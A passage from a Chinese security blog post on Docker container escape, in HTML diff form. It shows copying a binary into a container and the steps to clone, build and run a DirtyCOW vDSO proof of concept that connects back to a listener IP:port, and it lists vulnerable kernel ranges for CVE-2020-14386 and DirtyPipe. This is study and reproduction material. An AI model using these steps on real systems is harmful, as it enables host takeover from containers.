+  }
+}
+</code></pre><p>用go打包</p>
+<pre tabindex="0"><code>go build a.go
+</code></pre><p>模拟黑客把二进制文件传上去，并给予可执行权</p>
+<pre tabindex="0"><code>docker cp ./a 1f615cc4c464:/tmp
+chmod 777 /tmp/a
+</code></pre><h1 id="内核漏洞">内核漏洞</h1>
+<p>用exp造就完了</p>
+<h2 id="cve-2016-5195--dirtycow">CVE-2016-5195 : dirtyCOW</h2>
+<hr>
+<h3 id="条件-1">条件</h3>
+<p>执行 uname -r 命令，如果在 2.6.22 &lt;= 版本 &lt;= 4.8.3 之间说明可能存在 CVE-2016-5195 DirtyCow 漏洞。</p>
+<p>docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机</p>
+<h3 id="复现-1">复现</h3>
+<p>1、测试环境下载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>git clone https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//github.com/gebl/dirtycow-docker-vdso.git
+</span></span></span></code></pre></div><p>2、运行测试容器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>cd dirtycow<span style="color:#ff79c6">-</span>docker<span style="color:#ff79c6">-</span>vdso<span style="color:#ff79c6">/</span>
+</span></span><span style="display:flex;"><span>sudo docker<span style="color:#ff79c6">-</span>compose run dirtycow <span style="color:#ff79c6">/</span>bin<span style="color:#ff79c6">/</span>bash
+</span></span></code></pre></div><p>3、进入容器，编译POC并执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>cd <span style="color:#ff79c6">/</span>dirtycow<span style="color:#ff79c6">-</span>vdso<span style="color:#ff79c6">/</span>
+</span></span><span style="display:flex;"><span>make
+</span></span><span style="display:flex;"><span>.<span style="color:#ff79c6">/</span><span style="color:#bd93f9">0xdeadbeef</span> <span style="color:#bd93f9">192.168.172.136</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">1234</span>
+</span></span></code></pre></div><h3 id="2cve-2020-14386"><strong>2、CVE-2020-14386</strong></h3>
+<p>执行 uname -r 命令，如果在 4.6 &lt;= 版本 &lt; 5.9 之间说明可能存在 CVE-2020-14386 漏洞。</p>
+<h3 id="3cve-2022-0847-dirtypipe-逃逸"><strong>3、CVE-2022-0847 DirtyPipe 逃逸</strong></h3>
+<p>执行 uname -r 命令，如果在 5.8 &lt;= 版本 &lt; 5.10.102 &lt; 版本 &lt; 5.15.25 &lt; 版本 &lt; 5.16.11 之间说明可能存在 CVE-2022-0847 DirtyPipe 漏洞。</p>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/wiz_iam/" data-toggle="tooltip" data-placement="top" title="WIZ IAM挑战赛wp">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/%E6%9C%89%E5%85%B3%E9%80%83%E9%80%B8%E7%9A%84%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-toggle="tooltip" data-placement="top" title="有关docker逃逸的题目复现">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+                
+
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>FRIENDS</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://3cly.github.io/link/">3cly的博客</a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:muscial@outlook.jp">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/Muscial">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Muscial Blog 2024
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
